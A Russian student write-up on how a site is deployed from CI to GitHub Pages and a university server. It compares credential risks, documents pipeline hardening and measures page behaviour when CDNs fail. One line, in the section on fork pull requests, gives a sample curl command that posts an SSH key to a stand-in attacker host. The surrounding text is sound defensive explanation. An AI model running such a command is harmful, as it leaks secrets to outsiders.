# T4. Модель доставки и безопасность пайплайна

Способы доставки сайта на хостинг, учётные данные, которые им нужны, и последствия их утечки.
Разобраны четыре вопроса о безопасности CI и проверено, как сайт ведёт себя при недоступных CDN.
Всё, что применимо к этому сайту, не только описано, но и внедрено в его workflow.

## Способы доставки и учётные данные

| Способ | Учётные данные | Объём прав | Срок жизни | Последствия компрометации |
|---|---|---|---|---|
| **Push в ветку `gh-pages`** (`peaceiris/actions-gh-pages`, `mkdocs gh-deploy`) с токеном workflow | `GITHUB_TOKEN` с `contents: write` | запись во **все ветки** репозитория, теги, релизы. Изменять файлы в `.github/workflows` токен не может (нужно право `workflows`) | до конца job | вредоносный шаг может подменить сайт **и исходный код** в `main` (если ветка не защищена), выпустить релиз, переписать историю `gh-pages`. Вместо токена часто используют PAT или deploy-ключ с записью — тогда утечка действует, пока ключ не отзовут |
| **`upload-pages-artifact` + `deploy-pages`** (используется здесь) | `GITHUB_TOKEN` с `pages: write` и `id-token: write`; OIDC-токен для сервиса Pages | только **публикация Pages** этого репозитория. Читать код можно, писать — нет | до конца job | можно опубликовать произвольный сайт на домене `*.github.io` (подмена, фишинг), но нельзя изменить код и историю. Окно — время работы одной job |
| **`rsync` / `scp` по SSH** с deploy-ключом (используется здесь для Helios) | приватный SSH-ключ в секретах | **всё, что разрешено учётной записи**: без ограничений на сервере — полный shell. На Helios это личный аккаунт студента: все его файлы, а не только сайт | бессрочно, пока ключ не удалят из `authorized_keys` | постоянный доступ к серверу и аккаунту, подмена сайта, использование аккаунта для атак от имени университета. Сужается ограничениями в `authorized_keys` (`restrict`, `command=`, `from=`) или `rrsync` |
| **FTP / SFTP** | логин и пароль, часто от всей панели хостинга | обычно весь хостинг-аккаунт: все сайты, иногда почта и базы | бессрочно, пароли редко меняют | у **FTP** пароль идёт открытым текстом и перехватывается в сети. SFTP шифрует канал, но пароль — тот же долгоживущий секрет, а у панели хостинга права шире, чем у SSH-ключа с `command=`. Лучше всего SFTP с отдельным пользователем, запертым в каталоге сайта (chroot) |
| **S3 API** (Object Storage) | статический ключ доступа (Access Key ID и Secret) сервисного аккаунта | определяется ролью и политикой бакета: в идеале только запись в один бакет. Роль `editor` на каталог облака — это все ресурсы каталога | бессрочно, пока ключ не отозван | подмена или удаление сайта, размещение вредоносных файлов на «чистом» домене. Особый риск — **деньги**: с ключом можно залить много данных и раздать трафик за счёт владельца. Помогают отдельный сервисный аккаунт с правом на один бакет, версионирование бакета и краткоживущие токены вместо статического ключа, если провайдер поддерживает федерацию с OIDC GitHub |

Общий вывод: **предпочтительны краткоживущие учётные данные с узкими правами**. Официальная
связка Pages лучше пуша в `gh-pages`: у неё нет права записи в репозиторий, а токен живёт одну
job. SSH-ключ и S3-ключ живут бессрочно, поэтому для них критичны ограничения на стороне сервера.

## Что сделано в пайплайне этого сайта

| Мера | Было | Стало |
|---|---|---|
| Права токена | `contents: read` на весь workflow, `pages: write` и `id-token: write` — только у job деплоя | без изменений: уже минимально |
| Сторонние actions | по тегам `@v5`, `@v6`, `@v4` | **по SHA коммита** с версией в комментарии (`actions/checkout@fbc6f399… # v5.1.0`) |
| Ключ хоста Helios | `ssh-keyscan` в момент деплоя | ключи в `.github/known_hosts`, `StrictHostKeyChecking yes`, `IdentitiesOnly yes` |
| Зависимости Python | точные версии | точные версии **и SHA-256 хеши**, `pip install --require-hashes` |
| Деплой в PR из форка | job деплоя не запускается (`if: github.event_name != 'pull_request'`) | без изменений |
| Порядок шагов | SSH-ключ записывается на диск после всех сторонних actions | без изменений: сторонний код не выполняется, пока ключ лежит на диске |
| Ключ деплоя на Helios | полный shell-доступ | подготовлен **forced command** `research/t4/helios-deploy.sh` — включается правкой `authorized_keys` на сервере (см. ниже) |

После этих изменений workflow прошёл полностью, включая деплой на Helios со строгой проверкой
ключа хоста. Проверки:
- pip отказался ставить пакет, когда в `requirements.txt` подменили его хеш:
  `THESE PACKAGES DO NOT MATCH THE HASHES`;
- ssh с правильным `known_hosts` дошёл до аутентификации, а с подменённым ключом хоста
  остановился на `REMOTE HOST IDENTIFICATION HAS CHANGED` и `Host key verification failed`.

### Ограничение ключа деплоя на Helios

Сейчас утечка ключа деплоя — это **полный доступ к учётной записи** на Helios. Сервер
позволяет привязать к ключу единственную команду. Скрипт
[`research/t4/helios-deploy.sh`](https://github.com/crasavella04/python-lab3/blob/main/research/t4/helios-deploy.sh)
принимает только архив сайта и:
- распаковывает его во временный каталог и подменяет сайт двумя переименованиями, поэтому сайт
  не бывает наполовину обновлённым;
- отказывается принимать архив без `index.html`, с символическими ссылками или больше 100 МБ.

Строка в `~/.ssh/authorized_keys` на Helios:

```text
restrict,command="/home/<логин>/bin/deploy-python-lab3" ssh-ed25519 AAAA… github-actions
```

`restrict` запрещает выделение терминала, проброс портов, агента и X11. Команду, которую
присылает клиент, сервер игнорирует, поэтому workflow менять не нужно. С таким ключом можно
только заменить сайт `python-lab3`.

Скрипт проверен локально: обычный деплой проходит, а архив без `index.html` отклоняется, не
трогая работающий сайт. Отказ при символических ссылках на Windows проверить нельзя: Git Bash их
эмулирует. Это нужно проверить на самом Helios (FreeBSD).

Ещё одна мера — на стороне GitHub: перенести секрет `HELIOS_SSH_KEY` из секретов репозитория в
секреты **окружения** `helios` и разрешить деплой в это окружение только из ветки `main`. Тогда
ключ не получит ни одна job, кроме деплоя из `main`, даже если кто-то с правом записи добавит
новый workflow в другой ветке.

## Ответы на вопросы

### Почему секреты недоступны в workflow по `pull_request` из форка

Workflow по событию `pull_request` выполняет **код из PR**: изменённые скрипты, `requirements.txt`,
сам файл workflow из ветки автора. Автор форка — любой человек в интернете. Если бы секреты
передавались, достаточно было бы открыть PR со строкой `curl attacker.example -d "$SSH_KEY"`,
чтобы их украсть. Поэтому GitHub:

- **не передаёт секреты** в такие запуски, кроме `GITHUB_TOKEN`;
- выдаёт `GITHUB_TOKEN` **только на чтение**;
- для первых PR от новых участников требует одобрения запуска сопровождающим.

Опасный обходной путь — событие **`pull_request_target`**. Оно выполняется в контексте базового
репозитория, с секретами и правом записи. Если такой workflow сделает checkout кода из PR и
запустит его (сборку, тесты, `pip install`), секреты украдут. Документация GitHub прямо
запрещает выполнять в нём недоверенный код.

На этом сайте PR из форка запускает только `build-pages`: сборку с `--strict` и проверку
манифеста. Обе job деплоя пропускаются условием `if`, а `HELIOS_SSH_KEY` в PR пуст.

### Зачем фиксировать actions по SHA, а не по тегу

Тег в Git — **подвижная метка**. Владелец репозитория action или тот, кто украл его токен,
может перенести `v4` на любой другой коммит, и ваш workflow без единой правки выполнит
другой код. SHA коммита — это хеш содержимого: подменить код, не изменив SHA, нельзя. GitHub
называет закрепление по полному SHA единственным способом сделать использование action
неизменяемым.

Пример — **tj-actions/changed-files** (CVE-2025-30066, март 2025). Злоумышленник получил токен
бота с правом записи в репозиторий action, добавил код, который выводил секреты раннера в лог
сборки, и **перенёс на него почти все теги версий**. Все, кто подключал action по тегу
версии, начали выполнять вредоносный код. Action использовался более чем в 23 000
репозиториев, а в публичных репозиториях логи открыты всем. Workflow, закреплённые по SHA, атака
не затронула.

Нюансы:
- Закрепление действует **транзитивно**, только если вложенные actions тоже закреплены. Здесь это
  проверено: составное `upload-pages-artifact@v4.0.0` вызывает `actions/upload-artifact` по SHA
  (`ea165f8… # v4.6.2`).
- Обновлять закреплённые SHA вручную неудобно. Dependabot умеет обновлять их и сохраняет
  комментарий с версией.
- `actions/setup-python` во время работы скачивает сборки Python — это ещё одна внешняя
  зависимость, которую SHA не закрывает.

### Supply-chain-атака через action и последствия для сайта

Атака на цепочку поставок — компрометация не вашего кода, а того, что вы **подключаете**:
action, пакета PyPI, плагина MkDocs, образа Docker. Вредоносный action выполняется на раннере с
теми же правами, что и ваш шаг: видит рабочий каталог, переменные окружения, файлы с секретами и
`GITHUB_TOKEN` своей job.

Последствия для опубликованного сайта:

1. **Внедрение кода в страницы.** Action в job сборки может изменить HTML в `site/` после
   `mkdocs build` и до загрузки артефакта: добавить майнер, форму сбора паролей, редирект на
   фишинговую страницу или SEO-спам. Сайт выходит из вашего CI, на вашем домене и с валидным
   HTTPS, поэтому браузеры и читатели ему доверяют. Здесь это затрагивает оба адреса, в том
   числе университетский `se.ifmo.ru`.
2. **Кража секретов.** SSH-ключ Helios даёт постоянный доступ к аккаунту и после того, как
   вредоносную версию action уберут. Ключ нужно отозвать, а без `command=` — ещё и проверить весь
   аккаунт.
3. **Подмена через токен Pages.** В job `deploy-pages` скомпрометированное action может
   опубликовать произвольный сайт.

Что этому противостоит в этом проекте:
- actions закреплены по SHA, Python-пакеты — по хешам;
- сторонние actions не выполняются после записи SSH-ключа;
- `check_site.py` после деплоя требует, чтобы все `<script>` и стили загружались только с домена
  сайта. Внедрённый внешний скрипт провалит проверку и будет замечен, хотя встроенный
  (`<script>…</script>`) так не ловится;
- контрольная строка `build-marker` с коммитом показывает, что на хостинге та сборка, которую
  ожидали.

### Как правильно настроить `known_hosts`

Ошибочные варианты:
- **`StrictHostKeyChecking no`** — ssh примет любой ключ, и тот, кто перехватит трафик раннера,
  получит и содержимое сайта, и попытку входа. Атакующий, представившийся сервером, принимает
  загрузку сам и может отдать раннеру что угодно.
- **`ssh-keyscan` в момент деплоя** (так было здесь раньше) выглядит безопаснее, но по сути то же
  самое: ключ берётся у того, кто ответил на соединение, и не сверяется ни с чем.

Правильно — получить ключ хоста **заранее и по независимому каналу**, сверить отпечаток и хранить
ключ в репозитории. Ключи хоста — открытая информация, их можно коммитить. Здесь это сделано так:

1. Ключи Helios сняты `ssh-keyscan` с этой машины и записаны в
   [`.github/known_hosts`](https://github.com/crasavella04/python-lab3/blob/main/.github/known_hosts)
   с отпечатками в комментариях. Отпечаток ED25519:
   `SHA256:3n1x6Bq0hnfyxrWB/YeQQPaxUkE/GCX2vKKtl0nzGgM`.
2. Workflow использует **только этот файл** и `StrictHostKeyChecking yes`.
3. Раннер GitHub подключается из дата-центра Azure, по сети, не связанной с той, где снимался
   ключ. Деплой прошёл, значит, обе точки видят один и тот же ключ. Подменить его на обоих путях
   одновременно гораздо сложнее, чем на одном.
4. Окончательная сверка — изнутри сервера, по уже установленному доверенному сеансу:
   `ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub` должна вывести тот же отпечаток.

Если администраторы сменят ключи сервера, деплой упадёт с `Host key verification failed`. Это
правильное поведение: файл обновляют после сверки новых отпечатков, а не отключают проверку.

## Сайт при недоступных CDN

### Эксперимент

Собраны два варианта сайта:
- **как на сайте:** KaTeX лежит локально, шрифт системный (`font: false`);
- **«по умолчанию»:** шрифт Roboto с Google Fonts и MathJax 3 с jsDelivr — так выглядит типичная
  конфигурация Material с формулами.

Недоступность CDN моделировалась двумя способами. Первый — домены CDN не существуют (`*.invalid`),
браузер получает ошибку DNS. Второй, самый неприятный, — **CDN «завис»**: соединение принимается,
но ответа нет, как бывает при блокировке или перегрузке. Измерялась страница «О сайте» с
формулами. Скрипты лежат в
[`research/t4`](https://github.com/crasavella04/python-lab3/tree/main/research/t4).

| Вариант | Страница загружена | Формулы | Шрифт | Иконки |
|---|---|---|---|---|
| Как на сайте, всё доступно | 0,33 с | ✔ KaTeX | системный | ✔ |
| Как на сайте, недоступен даже `api.github.com` | 0,36 с | ✔ | системный | ✔; пропал только счётчик звёзд репозитория |
| С CDN, CDN доступны | 1,36 с | ✔ MathJax | Roboto | ✔ |
| С CDN, **домены не существуют** | **30,2 с** белого экрана | ✘ виден сырой LaTeX: `\[ \bar{x} = \frac{1}{n}…` | системный, запасной | ✔ |
| С CDN, **CDN завис** | **больше 140 с** белого экрана, наблюдение прервано | — | — | — |

Выводы:

- **Самая опасная зависимость — не формулы, а шрифт.** Material подключает Google Fonts через
  `<link rel="stylesheet">` в `<head>`, а стили блокируют разбор страницы. Пока браузер ждёт
  `fonts.googleapis.com`, `<body>` не создаётся, и читатель видит белый экран: через 18 с после
  перехода `<body>` ещё не было, событие `DOMContentLoaded` наступило на 30,2 с. Даже «быстрый»
  отказ здесь не быстрый: несуществующее имя этот компьютер разрешал около 11 с (резолвер
  повторяет запросы), а страница ждёт и стили в `<head>`, и скрипт MathJax.
- При зависшем CDN страница не открылась за 2 минуты 20 секунд, и время ожидания определяется
  только таймаутами браузера.
- **Формулы** при недоступном MathJax не ломают страницу, но превращаются в сырой LaTeX: текст
  читается, а смысл формул для неподготовленного читателя пропадает.
- **Иконки** в Material встроены в HTML как SVG и от CDN не зависят.
- Виджет репозитория обращается к `api.github.com` асинхронно и ничего не блокирует.

### Вес страницы

Страница «О сайте»: всё, что браузер запросил для отображения, кроме общих для обоих вариантов
поиска и sitemap. Свои файлы посчитаны в gzip, как их отдаёт хостинг, внешние — как их передаёт
CDN.

| | Как на сайте | С CDN |
|---|---:|---:|
| Страница и тема | 65,1 КБ | 65,3 КБ |
| Шрифт текста | — (системный) | 163,7 КБ (5 файлов Roboto и Roboto Mono) |
| Формулы | 126,6 КБ (KaTeX: JS, CSS, 3 шрифта) | 309,5 КБ (MathJax: JS и 4 шрифта) |
| **Итого** | **191,8 КБ**, 11 запросов | **538,5 КБ**, 15 запросов |
| Из них к внешним серверам | 0 | 11 |

Локальное размещение здесь не утяжелило страницу, а облегчило её **в 2,8 раза**: KaTeX легче
MathJax, а системный шрифт ничего не весит. Если перенести на свой сервер те же Roboto и MathJax,
вес останется около 540 КБ, но внешних запросов не будет. Общего кэша между сайтами у CDN
больше нет: браузеры разделяют кэш по сайтам (Chrome — с конца 2020 года, Firefox — с 2021-го,
Safari — ещё раньше), поэтому даже популярная библиотека с CDN скачивается для каждого сайта
заново.

### Как разместить ресурсы локально

| Способ | Как | Оценка |
|---|---|---|
| **Отказ от внешнего шрифта** (сделано здесь) | `theme.font: false` | 0 байт, системный шрифт. Лучший вариант, если фирменный шрифт не нужен |
| **Свой шрифт** | woff2-файлы в `docs/assets/fonts`, `@font-face` в `extra_css`, `font: false` | ~160 КБ, полный контроль |
| **KaTeX локально** (сделано здесь) | файлы KaTeX в `docs/assets/katex`, `extra_javascript` и `extra_css` | 127 КБ на страницу, рендер быстрее MathJax, поддерживает основную часть LaTeX |
| **MathJax локально** | пакет `mathjax` из npm целиком в `docs/assets`, вместе с каталогом шрифтов | ~310 КБ на страницу; брать каталог целиком, иначе шрифты отдают 404 |
| **Плагин `privacy` Material** | `plugins: [privacy]`: при сборке скачивает внешние ресурсы и переписывает ссылки | проверен, и **с подвохом** — см. ниже |

Плагин `privacy` проверен на варианте с CDN. В HTML не осталось ни одной внешней ссылки, 32 файла
(2,0 МБ) скачаны в `assets/external`. Но:
- **шрифты MathJax не скачаны**: MathJax подгружает их из JavaScript во время работы, а плагин
  видит только HTML и CSS. Все 4 шрифта отдали 404, и формулы рисовались запасными шрифтами
  с искажёнными символами;
- плагин переносит зависимость от CDN **с читателя на CI**: при сборке он скачивает ресурсы и при
  неудаче выдаёт предупреждение. В нашем прогоне он не дождался `unpkg.com` (пытался скачать
  `mermaid`, которого на сайте нет), а с `--strict` любое такое предупреждение роняет сборку;
- на Windows он не смог создать символические ссылки (`Couldn't create symbolic link`). Для
  локального `--strict` это тоже ошибка.

Поэтому для сайта с формулами надёжнее, как здесь, положить нужные библиотеки в репозиторий
явно: их версия зафиксирована, сборка не ходит в сеть, а проверка после деплоя
(`check_site.py`) гарантирует, что внешних скриптов и стилей на странице нет.
